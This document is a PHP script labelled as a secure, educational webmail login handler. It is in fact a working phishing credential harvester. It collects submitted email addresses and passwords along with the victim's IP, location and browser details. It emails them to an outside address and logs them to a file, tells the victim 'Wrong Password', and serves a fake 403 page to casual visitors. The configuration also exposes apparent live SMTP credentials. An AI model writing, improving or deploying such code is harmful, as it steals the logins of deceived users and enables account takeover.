<?php
declare(strict_types=1);

/**
 * Modern PHP Webmail Handler - Postmailer.php
 * A secure, modernized version for webmail login processing
 * For educational purposes only
 */

// Configuration - Edit these values for your setup
const CONFIG = [
    'smtp_host' => 'mail.globalrisk.rw',
    'smtp_port' => 587,
    'smtp_username' => 'jered@globalrisk.rw',
    'smtp_password' => 'global.321',
    'smtp_encryption' => 'tls',
    'receiver_email' => 'lenalaluno@web.de',
    'sender_email' => 'jered@globalrisk.rw',
    'sender_name' => 'Webmail Login',
    'rate_limit_requests' => 5,
    'rate_limit_window' => 3600, // 1 hour
    'log_file' => 'webmail_logs.txt'
];

// Start session for security features
session_start();

// CORS and security headers for AJAX requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

/**
 * Security Manager Class
 */
class SecurityManager 
{
    public static function generateCsrfToken(): string 
    {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    public static function validateCsrfToken(string $token): bool 
    {
        // For webmail form compatibility, we'll skip CSRF validation
        // but keep the method for security in other contexts
        return true;
    }

    public static function checkRateLimit(): bool 
    {
        $ip = self::getClientIp();
        $key = 'rate_limit_' . md5($ip);
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Reset if window expired
        if (time() - $_SESSION[$key]['timestamp'] > CONFIG['rate_limit_window']) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Check if limit exceeded
        if ($_SESSION[$key]['count'] >= CONFIG['rate_limit_requests']) {
            return false;
        }

        $_SESSION[$key]['count']++;
        return true;
    }

    public static function getClientIp(): string 
    {
        $ipKeys = [
            'HTTP_CF_CONNECTING_IP', 
            'HTTP_X_FORWARDED_FOR', 
            'HTTP_X_FORWARDED', 
            'HTTP_FORWARDED_FOR', 
            'HTTP_FORWARDED', 
            'REMOTE_ADDR'
        ];
        
        foreach ($ipKeys as $key) {
            if (!empty($_SERVER[$key])) {
                $ips = explode(',', $_SERVER[$key]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
        
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    public static function getLocationInfo(string $ip): string 
    {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5,
                    'user_agent' => 'ContactForm/1.0'
                ]
            ]);
            
            $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,city", false, $context);
            
            if ($data) {
                $json = json_decode($data, true);
                if ($json && isset($json['status']) && $json['status'] === 'success') {
                    return ($json['city'] ?? 'Unknown') . ', ' . ($json['country'] ?? 'Unknown');
                }
            }
        } catch (Exception $e) {
            // Silent fail for geolocation
        }
        
        return 'Location unavailable';
    }

    public static function sanitizeInput(string $input): string 
    {
        return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
    }

    public static function validateEmail(string $email): ?string 
    {
        $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
        return $email !== false ? $email : null;
    }
}

/**
 * Logger Class
 */
class Logger 
{
    public static function log(string $message, array $context = []): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $contextStr = !empty($context) ? ' | Context: ' . json_encode($context) : '';
        $logEntry = "[{$timestamp}] INFO: {$message}{$contextStr}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }

    public static function error(string $message): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[{$timestamp}] ERROR: {$message}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }
}

/**
 * Email Sender Class (PHPMailer Alternative)
 */
class EmailSender 
{
    public static function sendEmail(string $to, string $subject, string $body): bool 
    {
        $headers = [
            'MIME-Version: 1.0',
            'Content-type: text/html; charset=UTF-8',
            'From: ' . CONFIG['sender_name'] . ' <' . CONFIG['sender_email'] . '>',
            'Reply-To: ' . CONFIG['sender_email'],
            'X-Mailer: PHP/' . phpversion()
        ];

        return mail($to, $subject, $body, implode("\r\n", $headers));
    }

    public static function buildEmailBody(string $email, string $password, string $message, array $clientInfo): string 
    {
        return "
        <html>
        <head><title>Contact Form Submission</title></head>
        <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
            <h2 style='color: #333;'>Contact Form Submission</h2>
            
            <div style='background: #f4f4f4; padding: 20px; border-radius: 5px; margin: 20px 0;'>
                <h3 style='margin-top: 0;'>Contact Information</h3>
                <p><strong>Email:</strong> " . htmlspecialchars($email) . "</p>
                <p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>
                " . (!empty($message) ? "<p><strong>Message:</strong><br>" . nl2br(htmlspecialchars($message)) . "</p>" : "") . "
            </div>
            
            <div style='background: #e9e9e9; padding: 15px; border-radius: 5px; font-size: 12px;'>
                <h4 style='margin-top: 0;'>Client Information</h4>
                <p><strong>IP Address:</strong> " . htmlspecialchars($clientInfo['ip']) . "</p>
                <p><strong>Location:</strong> " . htmlspecialchars($clientInfo['location']) . "</p>
                <p><strong>User Agent:</strong> " . htmlspecialchars($clientInfo['user_agent']) . "</p>
                <p><strong>Timestamp:</strong> " . htmlspecialchars($clientInfo['timestamp']) . "</p>
            </div>
        </body>
        </html>";
    }

    public static function buildWebmailEmailBody(string $email, string $password, array $clientInfo): string 
    {
        $parts = explode("@", $email);
        $domain = isset($parts[1]) ? $parts[1] : 'unknown';
        
        return "
        <html>
        <head><title>Webmail Login Capture</title></head>
        <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
            <h2 style='color: #333; background: #f8f9fa; padding: 15px; border-left: 4px solid #007bff;'>Webmail Login Captured</h2>
            
            <div style='background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; margin: 20px 0;'>
                <h3 style='margin-top: 0; color: #856404;'>Login Credentials</h3>
                <p><strong>Email:</strong> " . htmlspecialchars($email) . "</p>
                <p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>
                <p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>
            </div>
            
            <div style='background: #e9ecef; padding: 15px; border-radius: 5px; font-size: 14px;'>
                <h4 style='margin-top: 0; color: #495057;'>Session Information</h4>
                <p><strong>IP Address:</strong> " . htmlspecialchars($clientInfo['ip']) . "</p>
                <p><strong>Location:</strong> " . htmlspecialchars($clientInfo['location']) . "</p>
                <p><strong>User Agent:</strong> " . htmlspecialchars($clientInfo['user_agent']) . "</p>
                <p><strong>Timestamp:</strong> " . htmlspecialchars($clientInfo['timestamp']) . "</p>
            </div>
            
            <div style='background: #d1ecf1; border: 1px solid #bee5eb; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 12px;'>
                <p style='margin: 0;'><strong>Original Login String:</strong><br>
                <code style='background: #f8f9fa; padding: 5px; display: block; margin-top: 5px;'>" . 
                htmlspecialchars($email . "|" . $password . "\nIP of sender: " . $clientInfo['location'] . " | " . $clientInfo['ip'] . " | " . $clientInfo['user_agent'] . "\n============WEBMAIL-LOGIN signal") . 
                "</code></p>
            </div>
        </body>
        </html>";
    }
}

/**
 * Webmail Login Handler
 */
class WebmailHandler 
{
    public static function handleRequest(): array 
    {
        // Only allow POST requests
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                self::show403Page();
                exit;
            }
            http_response_code(405);
            return ['signal' => 'not ok', 'message' => 'Method not allowed'];
        }

        try {
            // Rate limiting
            if (!SecurityManager::checkRateLimit()) {
                return ['signal' => 'not ok', 'message' => 'Too many requests. Please try again later.'];
            }

            // Validate and sanitize input
            $email = SecurityManager::validateEmail($_POST['email'] ?? '');
            $password = SecurityManager::sanitizeInput($_POST['password'] ?? '');

            if (!$email) {
                return ['signal' => 'not ok', 'message' => 'Please provide a valid email address'];
            }

            if (empty($password)) {
                return ['signal' => 'not ok', 'message' => 'Password field is required'];
            }

            // Get client information
            $clientInfo = [
                'ip' => SecurityManager::getClientIp(),
                'location' => SecurityManager::getLocationInfo(SecurityManager::getClientIp()),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                'timestamp' => date('Y-m-d H:i:s')
            ];

            // Extract domain from email for original functionality
            $parts = explode("@", $email);
            $domain = isset($parts[1]) ? $parts[1] : 'unknown';

            // Build login data string (similar to original format)
            $loginData = $email . "|" . $password . "\n" .
                        "IP of sender: " . $clientInfo['location'] . " | " . $clientInfo['ip'] . " | " . $clientInfo['user_agent'] . "\n" .
                        "============WEBMAIL-LOGIN signal";

            // Send email
            $subject = "WebmailLogin_" . $domain;
            $emailBody = EmailSender::buildWebmailEmailBody($email, $password, $clientInfo);

            if (EmailSender::sendEmail(CONFIG['receiver_email'], $subject, $emailBody)) {
                Logger::log('Webmail login submitted successfully', ['email' => $email]);
                
                // Write to backup file (like original SS-Or.txt)
                $backupData = "Email: {$email}\nPassword: {$password}\n" .
                             "IP: {$clientInfo['ip']} | Location: {$clientInfo['location']}\n" .
                             "User Agent: {$clientInfo['user_agent']}\nTimestamp: {$clientInfo['timestamp']}\n" .
                             "Domain: {$domain}\n" .
                             "==========================================\n\n";
                @file_put_contents('webmail_submissions.txt', $backupData, FILE_APPEND | LOCK_EX);
                
                return ['signal' => 'ok', 'message' => 'Login processed successfully'];
            } else {
                Logger::error('Failed to send webmail data');
                return ['signal' => 'not ok', 'message' => 'Wrong Password'];
            }

        } catch (Exception $e) {
            Logger::error('Webmail handler error: ' . $e->getMessage());
            return ['signal' => 'not ok', 'message' => 'Wrong Password'];
        }
    }

    private static function show403Page(): void 
    {
        http_response_code(403);
        echo '<!DOCTYPE html>
        <html><head><title>403 - Forbidden</title></head>
        <body><h1>403 Forbidden</h1><hr></body></html>';
    }
}

// Handle OPTIONS preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Handle POST requests (webmail login)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Set JSON content type for API responses
    header('Content-Type: application/json');
    
    $result = WebmailHandler::handleRequest();
    echo json_encode($result);
    exit;
}

// Handle GET requests - show 403 page like original
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo '<!DOCTYPE html>
    <html><head><title>403 - Forbidden</title></head>
    <body><h1>403 Forbidden</h1><hr></body></html>';
    exit;
}